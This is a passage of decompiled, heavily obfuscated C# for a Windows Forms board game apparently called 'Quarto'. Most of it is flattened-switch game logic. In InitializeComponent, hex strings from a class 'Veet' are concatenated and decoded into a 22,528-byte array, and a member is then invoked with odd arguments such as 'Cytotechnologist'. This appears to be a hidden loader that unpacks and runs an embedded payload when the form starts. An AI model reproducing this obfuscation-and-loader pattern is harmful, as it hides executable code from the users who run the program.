						num62 = 1207070820;
						num63 = 1207070820;
					}
					else
					{
						num62 = 1064539572;
						num63 = 1064539572;
					}
					num = num62 ^ (int)(num2 * 1757628328);
					continue;
				}
				case 48u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 430524680;
						continue;
					}
					goto IL_055d;
				case 47u:
					num10 = ((mem[2, num5].Square == mem[3, num5].Square) ? 1 : 0);
					goto IL_0144;
				case 46u:
				{
					int num54;
					if (mem[0, num5].Dark != mem[1, num5].Dark)
					{
						num = 2103643791;
						num54 = 2103643791;
					}
					else
					{
						num = 131822146;
						num54 = 131822146;
					}
					continue;
				}
				case 45u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = ((int)num2 * -1552926148) ^ 0xF6C2DFB;
						continue;
					}
					goto IL_03cd;
				case 44u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = (int)((num2 * 792969780) ^ 0x25D89BE6);
						continue;
					}
					goto IL_04ac;
				case 43u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -226510025) ^ -903707099;
						continue;
					}
					goto IL_00b8;
				case 42u:
					num = 608040771;
					continue;
				case 41u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = ((int)num2 * -1204284528) ^ -756600657;
						continue;
					}
					goto IL_03cd;
				case 40u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = 629610730;
						continue;
					}
					goto IL_06a2;
				case 39u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -504804837) ^ 0x68A76401;
						continue;
					}
					goto IL_00f4;
				case 38u:
				{
					int num36;
					int num37;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num36 = -877823899;
						num37 = -877823899;
					}
					else
					{
						num36 = -108908865;
						num37 = -108908865;
					}
					num = num36 ^ (int)(num2 * 933862144);
					continue;
				}
				case 37u:
					if (mem[3, num5] != null)
					{
						num = (int)(num2 * 980229052) ^ -274512660;
						continue;
					}
					goto IL_0143;
				case 36u:
				{
					int num29;
					int num30;
					if (mem[num5, 3] != null)
					{
						num29 = 149809913;
						num30 = 149809913;
					}
					else
					{
						num29 = 874933861;
						num30 = 874933861;
					}
					num = num29 ^ ((int)num2 * -1555896204);
					continue;
				}
				case 35u:
				{
					int num22;
					int num23;
					if (mem[num5, 0] != null)
					{
						num22 = 1612848618;
						num23 = 1612848618;
					}
					else
					{
						num22 = 1532984950;
						num23 = 1532984950;
					}
					num = num22 ^ (int)(num2 * 758256617);
					continue;
				}
				case 34u:
					flag3 = true;
					num = (int)(num2 * 1429751266) ^ -105900144;
					continue;
				case 33u:
				{
					int num18;
					int num19;
					if (mem[num5, 1] == null)
					{
						num18 = -1610095611;
						num19 = -1610095611;
					}
					else
					{
						num18 = -261473921;
						num19 = -261473921;
					}
					num = num18 ^ (int)(num2 * 1652395548);
					continue;
				}
				case 32u:
				{
					int num14;
					if (mem[num5, 0].Dark != mem[num5, 1].Dark)
					{
						num = 1941146158;
						num14 = 1941146158;
					}
					else
					{
						num = 1840673730;
						num14 = 1840673730;
					}
					continue;
				}
				case 31u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = (int)((num2 * 1459789207) ^ 0x69B574C8);
						continue;
					}
					goto IL_04ac;
				case 30u:
				{
					int num7;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 330904746;
						num7 = 330904746;
					}
					else
					{
						num = 2048001452;
						num7 = 2048001452;
					}
					continue;
				}
				case 29u:
				{
					int num72;
					int num73;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num72 = -630547879;
						num73 = -630547879;
					}
					else
					{
						num72 = -1107761350;
						num73 = -1107761350;
					}
					num = num72 ^ ((int)num2 * -1545230883);
					continue;
				}
				case 28u:
				{
					int num68;
					int num69;
					if (mem[2, 2] != null)
					{
						num68 = -2097821086;
						num69 = -2097821086;
					}
					else
					{
						num68 = -824479176;
						num69 = -824479176;
					}
					num = num68 ^ (int)(num2 * 1489207839);
					continue;
				}
				case 27u:
				{
					int num66;
					int num67;
					if (!flag4)
					{
						num66 = 703912022;
						num67 = 703912022;
					}
					else
					{
						num66 = 1360735800;
						num67 = 1360735800;
					}
					num = num66 ^ (int)(num2 * 53535676);
					continue;
				}
				case 26u:
				{
					int num60;
					int num61;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num60 = 606411724;
						num61 = 606411724;
					}
					else
					{
						num60 = 2041480917;
						num61 = 2041480917;
					}
					num = num60 ^ (int)(num2 * 1447187);
					continue;
				}
				case 25u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = ((int)num2 * -1526853925) ^ -1261940157;
						continue;
					}
					goto IL_06a2;
				case 24u:
				{
					int num57;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 312253569;
						num57 = 312253569;
					}
					else
					{
						num = 52615359;
						num57 = 52615359;
					}
					continue;
				}
				case 23u:
				{
					int num52;
					int num53;
					if (mem[1, num5].Big == mem[2, num5].Big)
					{
						num52 = -1400071224;
						num53 = -1400071224;
					}
					else
					{
						num52 = -1722320810;
						num53 = -1722320810;
					}
					num = num52 ^ (int)(num2 * 873819051);
					continue;
				}
				case 22u:
					num49 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_00b9;
				case 21u:
				{
					int num50;
					int num51;
					if (mem[0, num5].Big == mem[1, num5].Big)
					{
						num50 = -1431184356;
						num51 = -1431184356;
					}
					else
					{
						num50 = -1081828691;
						num51 = -1081828691;
					}
					num = num50 ^ ((int)num2 * -295380721);
					continue;
				}
				case 20u:
				{
					int num47;
					int num48;
					if (mem[num5, 2] == null)
					{
						num47 = -1068241627;
						num48 = -1068241627;
					}
					else
					{
						num47 = -187490571;
						num48 = -187490571;
					}
					num = num47 ^ ((int)num2 * -831924378);
					continue;
				}
				case 19u:
				{
					int num43;
					int num44;
					if (mem[num5, 1].Big != mem[num5, 2].Big)
					{
						num43 = 812781209;
						num44 = 812781209;
					}
					else
					{
						num43 = 1871681192;
						num44 = 1871681192;
					}
					num = num43 ^ ((int)num2 * -1474496601);
					continue;
				}
				case 18u:
				{
					int num41;
					int num42;
					if (mem[num5, 1].Dark == mem[num5, 2].Dark)
					{
						num41 = -712142298;
						num42 = -712142298;
					}
					else
					{
						num41 = -167422095;
						num42 = -167422095;
					}
					num = num41 ^ ((int)num2 * -1829804193);
					continue;
				}
				case 17u:
				{
					int num38;
					int num39;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num38 = -1211078713;
						num39 = -1211078713;
					}
					else
					{
						num38 = -1464906937;
						num39 = -1464906937;
					}
					num = num38 ^ ((int)num2 * -572542285);
					continue;
				}
				case 16u:
				{
					int num35;
					if (mem[num5, 0].Square != mem[num5, 1].Square)
					{
						num = 2117961917;
						num35 = 2117961917;
					}
					else
					{
						num = 1327488416;
						num35 = 1327488416;
					}
					continue;
				}
				case 15u:
				{
					int num33;
					int num34;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num33 = -1287282643;
						num34 = -1287282643;
					}
					else
					{
						num33 = -324761080;
						num34 = -324761080;
					}
					num = num33 ^ (int)(num2 * 1910919555);
					continue;
				}
				case 14u:
					if (mem[0, num5] != null)
					{
						num = 20282341;
						continue;
					}
					goto IL_0143;
				case 13u:
					num = ((int)num2 * -1636270634) ^ 0x9E009FB;
					continue;
				case 11u:
				{
					int num28;
					if (mem[0, num5].Point == mem[1, num5].Point)
					{
						num = 1757484561;
						num28 = 1757484561;
					}
					else
					{
						num = 714801407;
						num28 = 714801407;
					}
					continue;
				}
				case 10u:
					num5++;
					num = (int)((num2 * 146010490) ^ 0x5B1481D1);
					continue;
				case 9u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -330922954) ^ 0x46FDED66;
						continue;
					}
					goto IL_02a8;
				case 8u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 21601514) ^ -1872749606;
						continue;
					}
					goto IL_02a8;
				case 7u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -379606863) ^ 0x7B9A6F98;
						continue;
					}
					goto IL_055d;
				case 6u:
				{
					int num20;
					int num21;
					if (mem[num5, 0].Big == mem[num5, 1].Big)
					{
						num20 = -1241258452;
						num21 = -1241258452;
					}
					else
					{
						num20 = -1503475488;
						num21 = -1503475488;
					}
					num = num20 ^ ((int)num2 * -1400536972);
					continue;
				}
				case 5u:
				{
					int num15;
					int num16;
					if (mem[0, 0] == null)
					{
						num15 = -1542369910;
						num16 = -1542369910;
					}
					else
					{
						num15 = -1338150177;
						num16 = -1338150177;
					}
					num = num15 ^ ((int)num2 * -1511576386);
					continue;
				}
				case 4u:
					flag3 = true;
					num = (int)(num2 * 1292135966) ^ -629070213;
					continue;
				case 3u:
				{
					int num12;
					int num13;
					if (flag2)
					{
						num12 = -369681423;
						num13 = -369681423;
					}
					else
					{
						num12 = -1788915321;
						num13 = -1788915321;
					}
					num = num12 ^ ((int)num2 * -327613488);
					continue;
				}
				case 2u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = ((int)num2 * -635048559) ^ -176535406;
						continue;
					}
					goto IL_04ac;
				case 1u:
				{
					int num8;
					int num9;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num8 = -526535194;
						num9 = -526535194;
					}
					else
					{
						num8 = -1652091909;
						num9 = -1652091909;
					}
					num = num8 ^ (int)(num2 * 1773885189);
					continue;
				}
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -199493892;
						num4 = -199493892;
					}
					else
					{
						num3 = -531885198;
						num4 = -531885198;
					}
					num = num3 ^ (int)(num2 * 370940349);
					continue;
				}
				case 12u:
					break;
				default:
					{
						return result;
					}
					IL_04ac:
					num10 = 1;
					goto IL_0144;
					IL_0143:
					num10 = 0;
					goto IL_0144;
					IL_0144:
					flag = (byte)num10 != 0;
					num = 1293827937;
					continue;
					IL_03cd:
					num10 = 1;
					goto IL_0144;
					IL_06a2:
					num10 = 0;
					goto IL_0144;
					IL_00f4:
					num49 = 1;
					goto IL_00b9;
					IL_055d:
					num49 = 0;
					goto IL_00b9;
					IL_00b8:
					num49 = 0;
					goto IL_00b9;
					IL_02a8:
					num49 = 1;
					goto IL_00b9;
					IL_00b9:
					flag2 = (byte)num49 != 0;
					num = 1323885533;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num = 0;
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		int num4 = default(int);
		bool result = default(bool);
		while (true)
		{
			int num2 = 1826541864;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x71B87A15u) % 14u)
				{
				case 13u:
					num++;
					num2 = ((int)num3 * -817723974) ^ -1548237955;
					continue;
				case 12u:
				{
					int num8;
					int num9;
					if (!flag2)
					{
						num8 = -1223980435;
						num9 = -1223980435;
					}
					else
					{
						num8 = -1187489346;
						num9 = -1187489346;
					}
					num2 = num8 ^ ((int)num3 * -17890431);
					continue;
				}
				case 11u:
					flag3 = num4 < 4;
					num2 = 623378296;
					continue;
				case 10u:
					flag2 = num < 4;
					num2 = 511770849;
					continue;
				case 9u:
					num4 = 0;
					num2 = 343039563;
					continue;
				case 8u:
					num2 = ((int)num3 * -1518176314) ^ -1720674564;
					continue;
				case 7u:
				{
					int num6;
					int num7;
					if (!flag3)
					{
						num6 = 459848749;
						num7 = 459848749;
					}
					else
					{
						num6 = 369271022;
						num7 = 369271022;
					}
					num2 = num6 ^ (int)(num3 * 1984487669);
					continue;
				}
				case 6u:
					num4++;
					num2 = 663438408;
					continue;
				case 5u:
					num2 = (int)((num3 * 1150895170) ^ 0x952958D);
					continue;
				case 2u:
				{
					int num5;
					if (mem[num, num4] != null)
					{
						num2 = 846417073;
						num5 = 846417073;
					}
					else
					{
						num2 = 2078997922;
						num5 = 2078997922;
					}
					continue;
				}
				case 1u:
					flag = false;
					num2 = (int)((num3 * 1657052085) ^ 0x8D28DD2);
					continue;
				case 0u:
					result = flag;
					num2 = ((int)num3 * -1794412116) ^ -789407899;
					continue;
				case 3u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = 2136162842;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x14F7398Eu) % 9u)
				{
				case 7u:
					num = ((int)num2 * -779076988) ^ -1667187781;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)label6, str);
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)(num2 * 1966898952) ^ -1692141013;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = ((int)num2 * -1323303416) ^ -909650820;
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -1150347009) ^ 0x7E0FE77F;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label1, "");
					num = (int)((num2 * 1002845644) ^ 0x133652FD);
					continue;
				case 2u:
					num = ((int)num2 * -40912997) ^ -1114756515;
					continue;
				case 1u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)((num2 * 413840686) ^ 0x4CD60522);
					continue;
				default:
					return;
				case 8u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -715760580;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0x82CBC20Eu) % 10u)
				{
				case 8u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 1570213895;
						num5 = 1570213895;
					}
					else
					{
						num4 = 190490194;
						num5 = 190490194;
					}
					num = num4 ^ (int)(num2 * 1589364806);
					continue;
				}
				case 7u:
					num = (int)(num2 * 1977153339) ^ -1120484020;
					continue;
				case 6u:
					num = ((int)num2 * -1020568155) ^ -429557169;
					continue;
				case 4u:
					num3 = ((components != null) ? 1 : 0);
					goto IL_0051;
				case 3u:
					Form1.smethod_51((IDisposable)components);
					num = (int)((num2 * 413186295) ^ 0x220B1142);
					continue;
				case 2u:
					if (disposing)
					{
						num = (int)((num2 * 353774487) ^ 0x72CD64D6);
						continue;
					}
					num3 = 0;
					goto IL_0051;
				case 1u:
					num = ((int)num2 * -1075562211) ^ 0x42C10335;
					continue;
				case 0u:
					((Form)this).Dispose(disposing);
					num = -1518132442;
					continue;
				default:
					return;
				case 9u:
					break;
				case 5u:
					return;
					IL_0051:
					flag = (byte)num3 != 0;
					num = -700159426;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0367: Unknown result type (might be due to invalid IL or missing references)
		//IL_0371: Expected O, but got Unknown
		object[] object_ = default(object[]);
		string string_ = default(string);
		int num3 = default(int);
		byte[] array = default(byte[]);
		while (true)
		{
			int num = 858539699;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6917A63Bu) % 133u)
				{
				case 132u:
					num = (int)((num2 * 947906513) ^ 0x3C10903D);
					continue;
				case 131u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)(num2 * 460537966) ^ -1207207842;
					continue;
				case 130u:
					num = (int)(num2 * 1747282331) ^ -205645424;
					continue;
				case 129u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)(num2 * 1208345666) ^ -678890222;
					continue;
				case 128u:
					num = ((int)num2 * -1539791269) ^ 0x7486DD52;
					continue;
				case 127u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)((num2 * 553133524) ^ 0x49CE8A51);
					continue;
				case 126u:
					num = (int)((num2 * 256963809) ^ 0x69B2BC1D);
					continue;
				case 125u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 79614328) ^ 0x6D8AD511);
					continue;
				case 124u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -846439947) ^ -1965918938;
					continue;
				case 123u:
					num = (int)(num2 * 337113546) ^ -926608484;
					continue;
				case 122u:
					num = ((int)num2 * -1931037999) ^ 0x5813BF61;
					continue;
				case 121u:
					label5 = Form1.smethod_57();
					num = (int)((num2 * 1057553135) ^ 0x40D7A8C1);
					continue;
				case 120u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)(num2 * 1406987108) ^ -1817052276;
					continue;
				case 119u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -1967618872) ^ 0x1623E138;
					continue;
				case 118u:
					num = ((int)num2 * -746321390) ^ -341124701;
					continue;
				case 117u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)(num2 * 2090130836) ^ -1098104634;
					continue;
				case 116u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 1737619691) ^ 0x541CDC66);
					continue;
				case 115u:
					num = ((int)num2 * -1620973029) ^ 0x349BABFA;
					continue;
				case 114u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 70693888) ^ 0x671316DE);
					continue;
				case 113u:
					components = Form1.smethod_52();
					num = ((int)num2 * -1911506288) ^ -870518304;
					continue;
				case 112u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1039310922) ^ -2013764190;
					continue;
				case 111u:
					num = ((int)num2 * -983395712) ^ 0x20800A4E;
					continue;
				case 110u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1387515545) ^ 0x55AFF00E);
					continue;
				case 109u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -95709787) ^ 0xA33D7D5;
					continue;
				case 108u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -269572733) ^ 0x724294A;
					continue;
				case 107u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -285569278) ^ 0x7FC183F0;
					continue;
				case 106u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -1164921886) ^ -1582911356;
					continue;
				case 105u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)((num2 * 903931010) ^ 0x1EBF3262);
					continue;
				case 104u:
					num = ((int)num2 * -838117946) ^ -962653921;
					continue;
				case 103u:
					num = ((int)num2 * -758237118) ^ -625763110;
					continue;
				case 102u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -211971310) ^ 0x7F6DD7D5;
					continue;
				case 101u:
					num = ((int)num2 * -358862545) ^ 0x3667E4BE;
					continue;
				case 100u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1841548506) ^ 0x5F757E94;
					continue;
				case 99u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -1435395697) ^ -535202727;
					continue;
				case 98u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 613239633) ^ 0x404DD310);
					continue;
				case 97u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -1675068078) ^ 0x41FF06D7;
					continue;
				case 96u:
					Form1.smethod_70(ComMember, object_);
					num = (int)(num2 * 547361072) ^ -1250235767;
					continue;
				case 95u:
					num = ((int)num2 * -593846261) ^ -2068266808;
					continue;
				case 94u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)(num2 * 234131032) ^ -481327451;
					continue;
				case 93u:
					num = (int)((num2 * 1057408640) ^ 0x6FE2DA82);
					continue;
				case 92u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 755402958) ^ 0xFD6A4F9);
					continue;
				case 91u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -251312185) ^ -166286133;
					continue;
				case 90u:
					num = (int)(num2 * 1574349415) ^ -10353307;
					continue;
				case 89u:
					num = (int)(num2 * 695045614) ^ -612463014;
					continue;
				case 88u:
					num = (int)((num2 * 250047667) ^ 0x29E28F4D);
					continue;
				case 87u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)((num2 * 765558384) ^ 0x1FB4F431);
					continue;
				case 86u:
					panel1 = Form1.smethod_55();
					num = ((int)num2 * -946875004) ^ -797677032;
					continue;
				case 85u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -1181482506) ^ 0xD1E842;
					continue;
				case 84u:
					num = ((int)num2 * -1863664812) ^ 0x31F3133E;
					continue;
				case 83u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -1959252453) ^ -1404404014;
					continue;
				case 82u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -1576363363) ^ -1518590976;
					continue;
				case 81u:
					num = ((int)num2 * -1602970896) ^ 0x625DA34;
					continue;
				case 80u:
					Form1.smethod_92((Control)(object)this);
					num = (int)(num2 * 1965043648) ^ -412967236;
					continue;
				case 79u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -1817461216) ^ 0x11547606;
					continue;
				case 78u:
					num = (int)(num2 * 877674260) ^ -1542535545;
					continue;
				case 77u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1934956078) ^ 0x21343A;
					continue;
				case 76u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -927695909) ^ -321146470;
					continue;
				case 75u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -415761881) ^ -640805591;
					continue;
				case 74u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = (int)(num2 * 1492147893) ^ -1671648994;
					continue;
				case 72u:
					num = ((int)num2 * -384737611) ^ 0x419CF23C;
					continue;
				case 71u:
					num = ((int)num2 * -160389767) ^ 0x8E90650;
					continue;
				case 70u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -1713526261) ^ -1247842741;
					continue;
				case 69u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)((num2 * 1837257277) ^ 0x6258FC41);
					continue;
				case 68u:
					num = (int)(num2 * 727740772) ^ -1869289845;
					continue;
				case 67u:
					num3++;
					num = ((int)num2 * -1045348085) ^ -388134232;
					continue;
				case 66u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = (int)(num2 * 64416646) ^ -122202662;
					continue;
				case 65u:
					label2 = Form1.smethod_57();
					num = (int)(num2 * 1683489620) ^ -174687768;
					continue;
				case 64u:
					string_ = Veet.Sa;
					num = ((int)num2 * -692031164) ^ 0x753E53E7;
					continue;
				case 63u:
					Form1.smethod_64((Control)(object)label6, 13);
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 2103769481) ^ -1979716483;
					continue;
				case 62u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)(num2 * 2098265249) ^ -782777666;
					continue;
				case 61u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -654818231) ^ 0x4A514DA0;
					continue;
				case 60u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -1908065930) ^ -1602875717;
					continue;
				case 59u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -1423311469) ^ 0x4A4F3B37;
					continue;
				case 58u:
					num = (int)((num2 * 965269893) ^ 0x198485A);
					continue;
				case 57u:
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -2088035490) ^ 0xD3C780B;
					continue;
				case 56u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -1503577131) ^ 0x62ACAF1F;
					continue;
				case 55u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -443683308) ^ 0x29BEBB8B;
					continue;
				case 54u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -356552070) ^ 0x77E6ECC;
					continue;
				case 53u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1438266568) ^ -1355045097;
					continue;
				case 52u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -2063654128) ^ -841038631;
					continue;
				case 51u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -123178966) ^ 0x1B93B20C;
					continue;
				case 50u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -1326328557) ^ 0x13342164;
					continue;
				case 49u:
					num3 = 0;
					num = ((int)num2 * -1850271173) ^ -241191159;
					continue;
				case 48u:
					array = new byte[22528];
					num = (int)((num2 * 1553947216) ^ 0xBF328EE);
					continue;
				case 47u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -1342800311) ^ 0x1D9A451B;
					continue;
				case 46u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -1119557404) ^ 0x7A31D7B2;
					continue;
				case 45u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -2051442949) ^ 0x6A665459;
					continue;
				case 44u:
					num = (int)(num2 * 1419768937) ^ -1008868908;
					continue;
				case 43u:
					Form1.smethod_61((Control)(object)label6, "label6");
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)(num2 * 512434410) ^ -926949909;
					continue;
				case 42u:
					num = (int)((num2 * 683903641) ^ 0x7D7E17BA);
					continue;
				case 41u:
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = ((int)num2 * -1514229842) ^ -2123610751;
					continue;
				case 40u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)((num2 * 1907389136) ^ 0x2F249464);
					continue;
				case 39u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)((num2 * 254297616) ^ 0x49C013E7);
					continue;
				case 38u:
					button2 = Form1.smethod_53();
					num = (int)(num2 * 1884109197) ^ -570952564;
					continue;
				case 37u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1466202716) ^ 0x6BCD4E74;
					continue;
				case 36u:
					num = ((int)num2 * -798357359) ^ 0x75076AB8;
					continue;
				case 35u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)(num2 * 963666557) ^ -1249662904;
					continue;
				case 33u:
					button1 = Form1.smethod_53();
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -1195208794) ^ -63109412;
					continue;
				case 32u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -335375482) ^ 0x540932AA;
					continue;
				case 31u:
					CharArray(array, string.Empty);
					num = (int)(num2 * 2120327198) ^ -561995758;
					continue;
				case 30u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -86201114) ^ 0xA401C47;
					continue;
				case 29u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -738196252) ^ 0x29F9AC67;
					continue;
				case 28u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -2100773067) ^ 0x5E855FE7;
					continue;
				case 27u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -1201422480) ^ -735322074;
					continue;
				case 26u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -187786019) ^ -814133278;
					continue;
				case 25u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)(num2 * 2029397254) ^ -14745998;
					continue;
				case 24u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -914567906) ^ -309699518;
					continue;
				case 23u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = ((int)num2 * -1957562419) ^ 0x1D4A70DE;
					continue;
				case 22u:
					num = (int)((num2 * 793470394) ^ 0x564A3C33);
					continue;
				case 21u:
				{
					int num4;
					if (num3 < 22528)
					{
						num = 827967874;
						num4 = 827967874;
					}
					else
					{
						num = 1930368578;
